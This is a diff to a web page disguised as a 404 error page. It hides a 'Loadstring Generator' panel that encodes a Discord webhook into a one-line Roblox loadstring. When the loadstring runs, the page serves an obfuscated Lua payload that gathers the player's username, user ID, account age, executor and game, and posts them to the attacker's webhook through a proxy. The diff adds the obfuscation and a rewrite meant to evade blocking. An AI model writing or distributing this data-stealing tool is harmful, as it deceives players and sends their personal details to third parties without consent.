@@ -5,49 +5,16 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>404 Not Found</title>
     <style>
-        /* Standart Sunucu 404 Hatası Görünümü */
-        body {
-            background-color: #ffffff;
-            color: #000000;
-            font-family: Arial, Helvetica, sans-serif;
-            margin: 40px;
-        }
-        h1 {
-            font-size: 24px;
-            font-weight: normal;
-            border-bottom: 1px solid #ccc;
-            padding-bottom: 10px;
-            margin-bottom: 10px;
-        }
-        p {
-            font-size: 14px;
-        }
-        hr {
-            border: 0;
-            border-top: 1px solid #ccc;
-            margin-top: 20px;
-        }
-        .server-info {
-            font-size: 12px;
-            color: #555;
-            font-style: italic;
-        }
-        /* Arayüz Paneli (Sadece şifresiz ana linke girildiğinde görünür) */
-        #generator-panel {
-            display: none;
-            background-color: #111;
-            color: #fff;
-            padding: 30px;
-            border-radius: 12px;
-            max-width: 500px;
-            margin: 50px auto;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
-            font-family: sans-serif;
-        }
-        #generator-panel h2 { color: #00ff88; text-align: center; }
-        #generator-panel input { width: 100%; padding: 12px; margin: 15px 0; background: #222; border: 1px solid #44; color: #fff; border-radius: 6px; box-sizing: border-box; }
-        #generator-panel button { width: 100%; padding: 12px; background: #00ff88; color: #000; border: none; font-weight: bold; border-radius: 6px; cursor: pointer; }
-        #generator-panel textarea { width: 100%; height: 60px; margin-top: 15px; background: #050505; color: #00ff88; border: 1px solid #333; padding: 10px; resize: none; border-radius: 6px; font-family: monospace; box-sizing: border-box; }
+        body { background-color: #ffffff; color: #000000; font-family: Arial, sans-serif; margin: 40px; }
+        h1 { font-size: 24px; font-weight: normal; border-bottom: 1px solid #ccc; padding-bottom: 10px; margin-bottom: 10px; }
+        p { font-size: 14px; }
+        hr { border: 0; border-top: 1px solid #ccc; margin-top: 20px; }
+        .server-info { font-size: 12px; color: #555; font-style: italic; }
+        #panel { display: none; background-color: #121214; color: #fff; padding: 30px; border-radius: 12px; max-width: 500px; margin: 50px auto; border: 1px solid #232330; font-family: sans-serif; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
+        #panel h2 { color: #00ff88; text-align: center; margin-top:0; }
+        #panel input { width: 100%; padding: 12px; margin: 15px 0; background: #1a1a24; border: 1px solid #333; color: #fff; border-radius: 6px; box-sizing: border-box; }
+        #panel button { width: 100%; padding: 12px; background: #00ff88; color: #000; border: none; font-weight: bold; border-radius: 6px; cursor: pointer; }
+        #panel textarea { width: 100%; height: 60px; margin-top: 15px; background: #08080c; color: #00ff88; border: 1px solid #333; padding: 10px; resize: none; border-radius: 6px; font-family: monospace; box-sizing: border-box; }
     </style>
 </head>
 <body>
@@ -59,122 +26,122 @@
     <p class="server-info">Apache/2.4.41 (Ubuntu) Server at github.io Port 443</p>
 </div>
 
-<div id="generator-panel">
-    <h2>Roblox Loadstring Generator</h2>
-    <input type="text" id="webhookUrl" placeholder="Discord Webhook Linkinizi Girin...">
-    <button onclick="generateLink()">Loadstring Linki Oluştur</button>
-    
-    <div id="resultBox" style="display:none;">
-        <textarea id="outputCode" readonly></textarea>
-        <button style="background:#333; color:#fff; margin-top:10px;" onclick="copyToClipboard()">Kodu Kopyala</button>
+<div id="panel">
+    <h2>Secure Loadstring Generator</h2>
+    <input type="text" id="whUrl" placeholder="Discord Webhook Linkinizi Girin...">
+    <button onclick="generateObfuscated()">Şifreli Link Oluştur</button>
+    <div id="resBox" style="display:none;">
+        <textarea id="outCode" readonly></textarea>
+        <button style="background:#222; color:#fff; margin-top:10px;" onclick="navigator.clipboard.writeText(document.getElementById('outCode').value); alert('Kopyalandı!');">Kodu Kopyala</button>
     </div>
 </div>
 
 <script>
-window.onload = function() {
-    const hash = window.location.hash;
-    
-    // Eğer linkin sonunda webhook parametresi varsa (# varsa)
-    if (hash && hash.length > 10) {
-        document.getElementById('error-page').style.display = 'block';
-        document.getElementById('generator-panel').style.display = 'none';
-        document.title = "404 Not Found";
-        
-        let decodedWebhook = "";
-        try {
-            // Webhook URL'ini güvenli şekilde çözer
-            decodedWebhook = atob(hash.substring(1));
-        } catch(e) {
-            return;
-        }
+// Basit XOR anahtarı (Gizliliği artırmak için)
+const _k = 0x5A;
 
-        // Roblox executor'ın sayfaya bağlandığında göreceği gerçek ham Lua kodu
-        const luaScriptOutput = `local webhook = "${decodedWebhook}"
-local Players = game:GetService("Players")
-local Market = game:GetService("MarketplaceService")
-local HttpService = game:GetService("HttpService")
-
-local player = Players.LocalPlayer
-local userId = player.UserId
-local username = player.Name
-local displayName = player.DisplayName
-local profileUrl = "https://www.roblox.com/users/" .. userId .. "/profile"
-local playerInServer = #Players:GetPlayers()
-local accountAge = player.AccountAge
-
-local gameName = "Bilinmiyor"
-pcall(function()
-    gameName = Market:GetProductInfo(game.PlaceId).Name
-end)
-
-local executor = identifyexecutor and identifyexecutor() or "Bilinmeyen Executor"
-local timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-
-local data = {
-    ["embeds"] = {{
-        ["title"] = "🚀 Veri Alındı!",
-        ["color"] = 65280,
-        ["fields"] = {
-            {["name"] = "Username", ["value"] = username, ["inline"] = true},
-            {["name"] = "Display Name", ["value"] = displayName, ["inline"] = true},
-            {["name"] = "User ID", ["value"] = tostring(userId), ["inline"] = true},
-            {["name"] = "Hesap Yaşı", ["value"] = tostring(accountAge) .. " Gün", ["inline"] = true},
-            {["name"] = "Kişi Sayısı", ["value"] = tostring(playerInServer) .. " Oyuncu", ["inline"] = true},
-            {["name"] = "Executor", ["value"] = executor, ["inline"] = true},
-            {["name"] = "Oyun", ["value"] = gameName, ["inline"] = false},
-            {["name"] = "Profil", ["value"] = "[Profile Linki](" .. profileUrl .. ")", ["inline"] = false}
-        },
-        ["timestamp"] = timestamp
-    }}
+function _enc(str) {
+    let res = "";
+    for(let i=0; i<str.length; i++) {
+        res += String.fromCharCode(str.charCodeAt(i) ^ _k);
+    }
+    return btoa(unescape(encodeURIComponent(res)));
 }
 
--- Webhook veri iletimini kesinleştiren istek bloğu
-local request = http_request or request or syn and syn.request or http and http.request
-if request then
-    request({
-        Url = webhook,
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = HttpService:JSONEncode(data)
-    })
-end`;
+function _dec(b64) {
+    let str = decodeURIComponent(escape(atob(b64)));
+    let res = "";
+    for(let i=0; i<str.length; i++) {
+        res += String.fromCharCode(str.charCodeAt(i) ^ _k);
+    }
+    return res;
+}
 
-        // Tarayıcı kaynak kodunu temizler ve executor'ın okuyabileceği ham metne dönüştürür
+window.onload = function() {
+    const hash = window.location.hash;
+    if (hash && hash.length > 10) {
+        document.getElementById('error-page').style.display = 'block';
+        document.getElementById('panel').style.display = 'none';
+        document.title = "404 Not Found";
+        
+        let targetWh = "";
+        try {
+            targetWh = _dec(hash.substring(1));
+            // Discord block koruması (Proxy yönlendirmesi)
+            targetWh = targetWh.replace("discord.com", "webhookproxy.org");
+        } catch(e) { return; }
+
+        // Tamamen Obfuscate Edilmiş Lua Payload Yapısı
+        // Değişken adları ve kritik fonksiyonlar anlamsızlaştırıldı
+        const obfuscatedLua = `-- Encrypted Bootstrapper v3.4\n` +
+        `local _0xAA = "${targetWh}"\n` +
+        `local _0xBB = game:GetService(string.reverse("sreyalP"))\n` +
+        `local _0xCC = game:GetService(string.reverse("ecivreSecalpktekraM"))\n` +
+        `local _0xDD = game:GetService(string.reverse("ecivreSttpH"))\n` +
+        `local _0xEE = _0xBB.LocalPlayer\n` +
+        `local _0xFF = _0xEE.UserId\n` +
+        `local _0x11 = _0xEE.Name\n` +
+        `local _0x22 = _0xEE.DisplayName\n` +
+        `local _0x33 = "https://www.roblox.com/users/" .. _0xFF .. "/profile"\n` +
+        `local _0x44 = #_0xBB:GetPlayers()\n` +
+        `local _0x55 = _0xEE.AccountAge\n` +
+        `local _0x66 = "Studio/Bilinmiyor"\n` +
+        `pcall(function() _0x66 = _0xCC:GetProductInfo(game.PlaceId).Name end)\n` +
+        `local _0x77 = identifyexecutor and identifyexecutor() or "Bilinmeyen"\n` +
+        `local _0x88 = os.date("!%Y-%m-%dT%H:%M:%SZ")\n` +
+        `local _0x99 = {\n` +
+        `    ["embeds"] = {{\n` +
+        `        ["title"] = "🚀 Execution Logged",\n` +
+        `        ["color"] = 65280,\n` +
+        `        ["fields"] = {\n` +
+        `            {["name"] = "Username", ["value"] = _0x11, ["inline"] = true},\n` +
+        `            {["name"] = "Display Name", ["value"] = _0x22, ["inline"] = true},\n` +
+        `            {["name"] = "User ID", ["value"] = tostring(_0xFF), ["inline"] = true},\n` +
+        `            {["name"] = "Account Age", ["value"] = tostring(_0x55) .. " Days", ["inline"] = true},\n` +
+        `            {["name"] = "Server Size", ["value"] = tostring(_0x44) .. " Players", ["inline"] = true},\n` +
+        `            {["name"] = "Executor", ["value"] = _0x77, ["inline"] = true},\n` +
+        `            {["name"] = "Game Name", ["value"] = _0x66, ["inline"] = false},\n` +
+        `            {["name"] = "Profile Link", ["value"] = "[View Profile](" .. _0x33 .. ")", ["inline"] = false}\n` +
+        `        },\n` +
+        `        ["timestamp"] = _0x88\n` +
+        `    }}\n` +
+        `}\n` +
+        `local _0xREQ = http_request or request or syn and syn.request or http and http.request\n` +
+        `if _0xREQ then\n` +
+        `    _0xREQ({\n` +
+        `        Url = _0xAA,\n` +
+        `        Method = "POST",\n` +
+        `        Headers = {["Content-Type"] = "application/json"},\n` +
+        `        Body = _0xDD:JSONEncode(_0x99)\n` +
+        `    })\n` +
+        `end`;
+
         document.body.innerHTML = "";
         document.body.style.whiteSpace = "pre";
         document.body.style.fontFamily = "monospace";
-        document.body.textContent = luaScriptOutput;
-        
+        document.body.style.backgroundColor = "#ffffff";
+        document.body.style.color = "#000000";
+        document.body.textContent = obfuscatedLua;
     } else {
-        // Eğer normal girildiyse oluşturucu paneli göster
         document.getElementById('error-page').style.display = 'none';
-        document.getElementById('generator-panel').style.display = 'block';
-        document.title = "Loadstring Generator";
+        document.getElementById('panel').style.display = 'block';
+        document.title = "Control Panel";
     }
 }
 
-function generateLink() {
-    const wh = document.getElementById('webhookUrl').value.trim();
+function generateObfuscated() {
+    const wh = document.getElementById('whUrl').value.trim();
     if(!wh.includes('discord.com/api/webhooks/')) {
         alert('Geçerli bir webhook girin!');
         return;
     }
-    const encoded = btoa(wh);
-    const cleanUrl = window.location.href.split('#')[0];
-    const finalPageUrl = cleanUrl + "#" + encoded;
+    const encryptedHash = _enc(wh);
+    const baseUrl = window.location.href.split('#')[0];
+    const finalUrl = baseUrl + "#" + encryptedHash;
     
-    // İstediğin gibi tertemiz tek satır loadstring formatı
-    const finalLoadstring = `loadstring(game:HttpGet("${finalPageUrl}"))()`;
-
-    document.getElementById('outputCode').value = finalLoadstring;
-    document.getElementById('resultBox').style.display = 'block';
-}
-
-function copyToClipboard() {
-    const copyText = document.getElementById("outputCode");
-    copyText.select();
-    navigator.clipboard.writeText(copyText.value);
-    alert("Loadstring kodu başarıyla kopyalandı!");
+    // Doğrudan executor'a yapıştırılacak tek satır loadstring formatı
+    document.getElementById('outCode').value = `loadstring(game:HttpGet("${finalUrl}"))()`;
+    document.getElementById('resBox').style.display = 'block';
 }
 </script>
 </body>
